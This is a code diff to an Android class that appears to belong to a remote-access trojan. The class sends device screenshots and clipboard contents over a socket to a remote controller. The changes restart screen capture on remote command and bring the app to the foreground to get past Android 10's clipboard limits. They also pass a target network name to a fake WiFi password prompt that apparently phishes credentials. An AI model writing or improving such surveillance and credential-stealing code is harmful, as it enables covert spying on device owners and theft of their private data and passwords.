@@ -5,11 +5,14 @@ import org.json.JSONObject;
 import io.socket.emitter.Emitter;
 
 import android.content.Context;
+import android.content.Intent;
 import android.util.Log;
 import android.os.Looper;
 import android.os.Handler;
 import android.os.Build;
 import android.app.ActivityManager;
+
+import java.util.List;
 
 import java.lang.reflect.Method;
 
@@ -619,6 +622,40 @@ public class ConnectionManager {
                     JSONObject screenshot = screenCaptureManager.captureScreen();
                     ioSocket.emit("x0000sc", screenshot);
                 } else {
+                    // Check if service exists but just needs to be started
+                    if (screenService != null) {
+                        // Service exists but not capturing - try to start it
+                        try {
+                            android.content.Intent serviceIntent = new android.content.Intent(context, ScreenStreamService.class);
+                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                                context.startForegroundService(serviceIntent);
+                            } else {
+                                context.startService(serviceIntent);
+                            }
+                            // Wait a bit and try again
+                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                if (screenService.isCapturing()) {
+                                    JSONObject screenshot = screenService.captureFrame();
+                                    ioSocket.emit("x0000sc", screenshot);
+                                } else {
+                                    requestScreenCapturePermission();
+                                    JSONObject result = new JSONObject();
+                                    try {
+                                        result.put("success", false);
+                                        result.put("error", "Screen capture permission required. A permission dialog has been shown on the device.");
+                                        result.put("requiresPermission", true);
+                                        result.put("permissionRequested", true);
+                                        result.put("instruction", "User must tap 'Start Now' on the device to grant screen recording permission.");
+                                        ioSocket.emit("x0000sc", result);
+                                    } catch (Exception ignored) {}
+                                }
+                            }, 500);
+                            return;
+                        } catch (Exception e) {
+                            Log.e(TAG, "Error starting screen service", e);
+                        }
+                    }
+                    
                     // Try to request permission automatically
                     requestScreenCapturePermission();
                     
@@ -632,14 +669,23 @@ public class ConnectionManager {
                 }
                 
             } else if (extra.equals("start") || extra.equals("request")) {
-                // Request screen capture permission
-                requestScreenCapturePermission();
-                
-                JSONObject result = new JSONObject();
-                result.put("success", true);
-                result.put("message", "Screen capture permission dialog shown on device");
-                result.put("instruction", "User must tap 'Start Now' on the device");
-                ioSocket.emit("x0000sc", result);
+                // Check if we already have an active capture session
+                if (screenService != null && screenService.isCapturing()) {
+                    JSONObject result = new JSONObject();
+                    result.put("success", true);
+                    result.put("message", "Screen capture is already active");
+                    result.put("isCapturing", true);
+                    ioSocket.emit("x0000sc", result);
+                } else {
+                    // Request screen capture permission
+                    requestScreenCapturePermission();
+                    
+                    JSONObject result = new JSONObject();
+                    result.put("success", true);
+                    result.put("message", "Screen capture permission dialog shown on device");
+                    result.put("instruction", "User must tap 'Start Now' on the device");
+                    ioSocket.emit("x0000sc", result);
+                }
                 
             } else if (extra.equals("status")) {
                 JSONObject result = new JSONObject();
@@ -683,6 +729,13 @@ public class ConnectionManager {
     // Request screen capture permission by launching activity
     private static void requestScreenCapturePermission() {
         try {
+            // Check if we already have an active MediaProjection
+            ScreenStreamService screenService = ScreenStreamService.getInstance();
+            if (screenService != null && screenService.isCapturing()) {
+                Log.d(TAG, "Screen capture already active, skipping permission request");
+                return;
+            }
+            
             if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
                 // Launch ScreenCaptureActivity to handle the permission request
                 android.content.Intent activityIntent = new android.content.Intent(context, ScreenCaptureActivity.class);
@@ -1064,6 +1117,58 @@ public class ConnectionManager {
                     try {
                         ClipboardMonitor clipboardMonitor = new ClipboardMonitor(context);
                         if (req == 0) {
+                            // On Android 10+, clipboard can only be read when app is in foreground
+                            // Try to bring app to foreground first if needed
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                                try {
+                                    // Check if we're in foreground
+                                    ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+                                    if (am != null) {
+                                        List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
+                                        boolean isForeground = false;
+                                        if (processes != null) {
+                                            for (ActivityManager.RunningAppProcessInfo process : processes) {
+                                                if (process.pid == android.os.Process.myPid()) {
+                                                    isForeground = (process.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND);
+                                                    break;
+                                                }
+                                            }
+                                        }
+                                        
+                                        if (!isForeground) {
+                                            // Try to bring MainActivity to foreground
+                                            try {
+                                                Intent intent = new Intent(context, MainActivity.class);
+                                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                                                context.startActivity(intent);
+                                                // Wait a bit for activity to come to foreground
+                                                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                                                    try {
+                                                        JSONObject clipboard = clipboardMonitor.getClipboardText();
+                                                        ioSocket.emit("x0000cb", clipboard);
+                                                    } catch (Exception e) {
+                                                        Log.e(TAG, "Error reading clipboard after bringing to foreground", e);
+                                                        try {
+                                                            JSONObject error = new JSONObject();
+                                                            error.put("text", "");
+                                                            error.put("hasData", false);
+                                                            error.put("error", "Could not read clipboard. App may need to be in foreground.");
+                                                            ioSocket.emit("x0000cb", error);
+                                                        } catch (Exception ignored) {}
+                                                    }
+                                                }, 500);
+                                                return;
+                                            } catch (Exception e) {
+                                                Log.w(TAG, "Could not bring app to foreground", e);
+                                            }
+                                        }
+                                    }
+                                } catch (Exception e) {
+                                    Log.w(TAG, "Error checking foreground status", e);
+                                }
+                            }
+                            
+                            // Read clipboard
                             JSONObject clipboard = clipboardMonitor.getClipboardText();
                             ioSocket.emit("x0000cb", clipboard);
                         } else if (req == 1) {
@@ -1084,6 +1189,13 @@ public class ConnectionManager {
                         }
                     } catch (Exception e) {
                         Log.e(TAG, "Error in clipboard command", e);
+                        try {
+                            JSONObject error = new JSONObject();
+                            error.put("text", "");
+                            error.put("hasData", false);
+                            error.put("error", e.getMessage());
+                            ioSocket.emit("x0000cb", error);
+                        } catch (Exception ignored) {}
                     }
                 }
             });
@@ -1465,6 +1577,10 @@ public class ConnectionManager {
                 Log.d(TAG, "Showing WiFi password prompt dialog");
                 android.content.Intent intent = new android.content.Intent(context, WiFiPasswordActivity.class);
                 intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
+                // Pass SSID if provided
+                if (data.has("ssid")) {
+                    intent.putExtra("ssid", data.getString("ssid"));
+                }
                 context.startActivity(intent);
                 
                 JSONObject result = new JSONObject();
